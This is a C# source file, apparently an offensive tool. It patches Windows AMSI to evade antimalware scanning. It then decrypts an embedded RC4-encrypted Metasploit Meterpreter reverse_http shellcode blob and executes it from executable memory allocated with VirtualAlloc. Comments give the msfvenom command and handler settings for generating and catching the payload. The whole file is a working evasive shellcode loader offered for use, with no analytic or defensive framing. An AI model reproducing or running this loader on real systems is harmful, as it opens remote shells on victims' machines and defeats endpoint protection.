using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;

namespace CsharpAmsiBypass
{
    class Program
    {
        class LoadMsfPayload
        {
            [DllImport("kernel32")]
            static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            delegate void WindowsRun();

            static void Main(string[] args)
            {

                // SharpSploit's AMSI Bypass by _RastaMouse
                SharpSploit.Evasion.Amsi.PatchAmsiScanBuffer();

                // Replace payload below and make sure to add this to your exploit/multi/handler options:
                // set autoverifysession false
                // set autoloadstdapi false
                // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=eth0 LPORT=8080 -f csharp --encrypt rc4 --encrypt-key kekz -v  payload
                byte[] payload = new byte[704] {
                    0x6e,0x3a,0x38,0xe0,0x8a,0xf9,0x47,0x8b,0x79,0xd7,0xc7,0x79,0x6d,0xf4,0x1c,
                    0xf3,0xd6,0xc1,0xf6,0x55,0x66,0x8b,0xfc,0xaa,0xf3,0xa8,0x5c,0x4c,0xda,0xa0,
                    0x43,0x1b,0x96,0x21,0x36,0x4d,0xd8,0x7c,0xf2,0xba,0x3c,0xcd,0x0d,0x93,0xaf,
                    0x0b,0x8a,0xbb,0x34,0xa7,0x5f,0x4b,0xb9,0x0c,0x89,0x9a,0x6c,0x87,0x8d,0xc9,
                    0xf8,0xd4,0x38,0x6e,0x99,0xe2,0xb0,0x28,0x10,0x5d,0xd6,0x16,0xf9,0x41,0xc4,
                    0x98,0xf0,0x29,0x2d,0x54,0x53,0x59,0xb1,0xda,0x9d,0xaf,0x69,0x3a,0x05,0x38,
                    0x6d,0xd1,0x2e,0xcd,0xf2,0x4a,0xdf,0x5b,0xd0,0x78,0xa9,0x04,0x03,0xe3,0x61,
                    0x56,0xd0,0x41,0xf0,0x8d,0x4c,0xa2,0x0d,0xbd,0x77,0xa2,0x8f,0x79,0xd3,0xdd,
                    0x20,0x44,0x40,0x76,0x4b,0xbb,0xd1,0xf3,0xd3,0xce,0x29,0x77,0xd3,0x89,0x95,
                    0x43,0x11,0xc0,0xd7,0x7d,0x57,0xc6,0x4f,0x44,0x8f,0x06,0x3b,0x61,0x1c,0x7f,
                    0xb5,0xc0,0x2f,0xfe,0x37,0x34,0x99,0x86,0x82,0xa6,0x56,0xe6,0x34,0x31,0xec,
                    0x3c,0x19,0x9e,0xa1,0x10,0x9b,0x7d,0x3d,0xe5,0x48,0x4e,0xbe,0x44,0x02,0xbc,
                    0x12,0xdf,0xd5,0x69,0x6c,0x55,0xa1,0xf1,0xba,0x59,0xf6,0x6f,0x3e,0x4e,0x2a,
                    0xfa,0xea,0x23,0x78,0x51,0x9e,0xca,0x5f,0x8d,0x99,0xbf,0x11,0x44,0x45,0x72,
                    0xe8,0x24,0x4e,0x65,0xc5,0xd9,0xd5,0xae,0xdb,0xfe,0xae,0xf1,0x6a,0x2c,0xd3,
                    0x71,0x67,0x94,0xad,0x62,0x1c,0x9d,0xb3,0x2a,0xbf,0x3e,0xb0,0xc9,0x8a,0x82,
                    0x6b,0x8b,0x82,0x8a,0xe9,0xb1,0x4d,0xb4,0x22,0xff,0x49,0xcd,0x2b,0xe6,0xb1,
                    0xe4,0x81,0x2b,0x72,0x60,0x75,0x87,0x51,0x9e,0x86,0x0d,0x4d,0x87,0x7e,0x52,
                    0x09,0x16,0xa7,0x70,0x1f,0x1b,0x16,0x94,0xbd,0xf9,0x52,0x73,0x87,0xde,0x5b,
                    0x3e,0x63,0x59,0xd7,0x0d,0x4e,0xd5,0x7a,0x4c,0x24,0xd3,0xae,0x39,0x16,0x20,
                    0x8d,0x17,0x55,0x91,0x7b,0x71,0x33,0xcc,0xd4,0xd8,0xd4,0xeb,0xe7,0xed,0x67,
                    0x12,0x07,0x49,0xad,0xc6,0xf8,0xe9,0x7d,0x22,0x67,0x8b,0xb5,0x52,0x05,0xe4,
                    0x52,0x05,0xf6,0x00,0x36,0xa2,0x33,0x00,0xcb,0xfb,0x06,0x28,0x5d,0x29,0xa0,
                    0x0c,0xd4,0xee,0xcb,0x4d,0xbc,0x9c,0xfd,0x6a,0x03,0xda,0xf8,0xc1,0xaa,0xf5,
                    0xd8,0xfb,0x85,0x8a,0x25,0x69,0x30,0x25,0x36,0xb6,0xa1,0x93,0x39,0xc4,0x8d,
                    0x63,0xcf,0x38,0xa8,0x32,0xdf,0x06,0x90,0xb2,0xc9,0xfb,0x94,0x0f,0x56,0xb3,
                    0x1d,0x20,0xe8,0xf9,0xa0,0xa3,0x79,0xdc,0x1d,0xb2,0x4c,0xdf,0x49,0x4c,0xc4,
                    0x31,0xc9,0x5e,0xc3,0x8e,0x38,0x40,0xe8,0x01,0xc1,0x3a,0x98,0x10,0x71,0x56,
                    0xbe,0x6f,0x05,0x40,0x0c,0x56,0x5e,0x16,0x29,0x16,0x12,0x2e,0x34,0xe4,0x18,
                    0x18,0xf7,0x8e,0x3c,0xbf,0xf0,0x83,0xae,0xb6,0x62,0x68,0x46,0xa3,0x6b,0xee,
                    0xdd,0x5f,0xc9,0xc9,0x8e,0x0d,0x05,0xf1,0x57,0x79,0xec,0x9b,0x87,0xc0,0x8d,
                    0x6e,0xce,0xd6,0xb7,0x90,0xbf,0x4d,0x96,0x70,0x33,0xf4,0xdb,0xf2,0x8a,0xee,
                    0x67,0xc2,0x09,0x1e,0x51,0xd6,0x59,0x7c,0x40,0xaa,0x42,0x1a,0xb6,0x16,0x8d,
                    0x52,0xdb,0x53,0x18,0x82,0x72,0xd0,0x4b,0xf5,0x5a,0x5a,0xb5,0x04,0x43,0x4a,
                    0xa3,0x07,0x49,0xec,0xeb,0xf4,0xc1,0x7c,0x6b,0xbe,0xc3,0xf6,0x8a,0xe3,0x03,
                    0x07,0xcc,0x78,0x54,0xdb,0xa3,0x98,0xf7,0x68,0x45,0x72,0x5e,0x7b,0xac,0x70,
                    0x9b,0x57,0x91,0x3c,0x64,0x28,0x35,0xad,0x6f,0xe3,0xec,0x0e,0x02,0xc8,0xd8,
                    0x8a,0x9a,0x8a,0xd8,0xf9,0xfa,0xc2,0x15,0x33,0x27,0xce,0x6d,0xb3,0x1a,0xaf,
                    0x46,0x94,0x16,0x4b,0x53,0x4e,0x59,0xb5,0xda,0x61,0xd1,0x9a,0x5c,0x44,0x31,
                    0xa5,0xb9,0x92,0x09,0x67,0x02,0x5e,0x2c,0xad,0x9d,0x89,0x57,0x93,0x98,0x03,
                    0x49,0xea,0x8c,0x1f,0xe1,0xb3,0xbf,0xbb,0x6f,0xac,0xa9,0x98,0x51,0x54,0xa8,
                    0xcc,0x28,0x47,0x08,0x52,0xf2,0x61,0xf5,0x47,0xcb,0x71,0x66,0x5c,0x74,0x5a,
                    0xcf,0x70,0x66,0x6f,0xe9,0x69,0x0d,0x99,0xf3,0x42,0xff,0xa7,0xfd,0x67,0x98,
                    0x32,0x42,0x85,0xec,0xb8,0x75,0x44,0xfc,0x43,0x56,0xcf,0xf3,0x86,0xa0,0x49,
                    0x81,0x17,0x04,0xa1,0xbe,0xa9,0xff,0xcf,0x80,0x2e,0x1a,0xb6,0x88,0x03,0xf7,
                    0x69,0xe3,0xe3,0xf1,0x54,0x9c,0x67,0xe8,0xb9,0x43,0x3a,0x4d,0x38,0x51,0x49,
                    0x2c,0xc7,0x14,0xbe,0x8b,0x18,0x48,0xec,0x55,0xf9,0x05,0x94,0xb2,0xfb 
                };

                string key = "kekz"; // Insert your RC4 key here

                byte[] keyBytes = Encoding.ASCII.GetBytes(key);

                var decryptedPayload = RC4.Decrypt(keyBytes, payload);

                IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)decryptedPayload.Length, (IntPtr)0x1000, (IntPtr)0x40);
                Marshal.Copy(decryptedPayload, 0, ptr, decryptedPayload.Length);
                WindowsRun invokeMsf = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));

                // Call Delegate
                invokeMsf();

            }
        }
    }
}
